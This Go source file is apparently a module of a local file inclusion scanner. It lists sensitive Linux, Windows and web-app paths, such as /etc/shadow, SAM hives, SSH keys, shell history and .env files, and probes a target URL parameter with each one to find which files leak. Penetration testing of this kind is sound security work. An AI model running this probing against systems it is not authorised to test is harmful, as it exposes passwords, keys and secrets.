package core

// FileDiscovery handles file discovery for LFI testing
type FileDiscovery struct {
	wordlist []string
}

// CommonConfigFiles common configuration file paths
var CommonConfigFiles = []string{
	// Linux config files
	"/etc/httpd/conf/httpd.conf",
	"/etc/apache2/apache2.conf",
	"/etc/apache2/httpd.conf",
	"/etc/nginx/nginx.conf",
	"/etc/php/*/php.ini",
	"/etc/php.ini",
	"/etc/mysql/my.cnf",
	"/etc/postgresql/*/main/postgresql.conf",
	"/etc/fstab",
	"/etc/hosts",
	"/etc/passwd",
	"/etc/shadow",
	"/etc/group",
	"/etc/sudoers",
	"/etc/crontab",
	"/etc/profile",
	"/etc/bashrc",
	"/etc/.bashrc",
	"/etc/.bash_profile",
	"/root/.bashrc",
	"/root/.bash_history",
	"/root/.ssh/authorized_keys",
	"/home/*/.bashrc",
	"/home/*/.ssh/authorized_keys",

	// Windows config files
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
	"C:\\Windows\\System32\\config\\SAM",
	"C:\\Windows\\System32\\config\\SYSTEM",
	"C:\\Windows\\win.ini",
	"C:\\Windows\\system.ini",
	"C:\\boot.ini",
	"C:\\autoexec.bat",
	"C:\\inetpub\\wwwroot\\web.config",
	"C:\\xampp\\apache\\conf\\httpd.conf",
	"C:\\xampp\\php\\php.ini",
	"C:\\wamp\\bin\\apache\\Apache*\\conf\\httpd.conf",

	// Web application configs
	"/var/www/html/config.php",
	"/var/www/html/wp-config.php",
	"/var/www/html/configuration.php",
	"/var/www/html/.env",
	"/var/www/html/app/config/database.php",
	"/var/www/html/application/config/database.php",
	"/var/www/html/include/db.php",
	"/var/www/html/inc/config.php",
	"/var/www/html/sites/default/settings.php",
	"/var/www/html/config/settings.php",
	"/var/www/html/lib/Db.php",

	// Log files
	"/var/log/apache2/access.log",
	"/var/log/apache2/error.log",
	"/var/log/httpd/access_log",
	"/var/log/httpd/error_log",
	"/var/log/nginx/access.log",
	"/var/log/nginx/error.log",
	"/var/log/lighttpd/access.log",
	"/var/log/lighttpd/error.log",
	"/var/log/messages",
	"/var/log/syslog",
	"/var/log/auth.log",
	"/var/log/secure",

	// Session files
	"/tmp/sess_",
	"/var/lib/php/sessions/sess_",
	"/var/tmp/sess_",
	"/tmp/sessions/sess_",
	"/var/www/tmp/sess_",

	// Git/SVN configs
	"/.git/config",
	"/.svn/entries",
	"/.hg/hgrc",

	// Backup files
	"*.bak",
	"*.old",
	"*.swp",
	"*.swo",
	"*~",
	"*.tmp",

	// Env files
	"/.env",
	"/.env.local",
	"/.env.production",
	"/.env.development",
	"/.env.example",
	"/var/www/html/.env",
	"/var/www/html/.env.local",
	"/var/www/html/.env.production",
	"/home/*/.env",
}

// DefaultFileDiscovery returns default file discovery
func DefaultFileDiscovery() *FileDiscovery {
	return &FileDiscovery{
		wordlist: CommonConfigFiles,
	}
}

// GetFileList returns the file discovery wordlist
func (fd *FileDiscovery) GetFileList() []string {
	return fd.wordlist
}

// GetLinuxFiles returns Linux-specific files
func (fd *FileDiscovery) GetLinuxFiles() []string {
	return []string{
		"/etc/passwd",
		"/etc/shadow",
		"/etc/group",
		"/etc/hosts",
		"/etc/httpd/conf/httpd.conf",
		"/etc/apache2/apache2.conf",
		"/etc/nginx/nginx.conf",
		"/etc/php.ini",
		"/etc/mysql/my.cnf",
		"/etc/crontab",
		"/var/log/apache2/access.log",
		"/var/log/apache2/error.log",
		"/var/log/nginx/access.log",
		"/var/log/nginx/error.log",
		"/proc/self/environ",
		"/proc/version",
		"/proc/cmdline",
		"/proc/self/status",
		"/root/.bashrc",
		"/root/.bash_history",
		"/root/.ssh/authorized_keys",
		"/var/www/html/.env",
		"/var/www/html/config.php",
		"/var/www/html/wp-config.php",
	}
}

// GetWindowsFiles returns Windows-specific files
func (fd *FileDiscovery) GetWindowsFiles() []string {
	return []string{
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"C:\\Windows\\System32\\config\\SAM",
		"C:\\Windows\\System32\\config\\SYSTEM",
		"C:\\Windows\\win.ini",
		"C:\\Windows\\system.ini",
		"C:\\boot.ini",
		"C:\\autoexec.bat",
		"C:\\inetpub\\wwwroot\\web.config",
		"C:\\xampp\\apache\\conf\\httpd.conf",
		"C:\\xampp\\php\\php.ini",
	}
}

// AddCustomFile adds a custom file to the discovery list
func (fd *FileDiscovery) AddCustomFile(file string) {
	fd.wordlist = append(fd.wordlist, file)
}

// DiscoverFiles attempts to discover accessible files
func (fd *FileDiscovery) DiscoverFiles(targetURL, param string, client *HTTPClient) []string {
	discovered := make([]string, 0)

	for _, file := range fd.wordlist {
		resp, err := client.SendParameter(targetURL, param, file, GET)
		if err != nil {
			continue
		}

		// Check if file content was returned
		analyzer := NewResponseAnalyzer()
		result := analyzer.Analyze(&Response{}, resp)

		if result.IsVulnerable || result.Confidence > 0.3 {
			discovered = append(discovered, file)
		}
	}

	return discovered
}
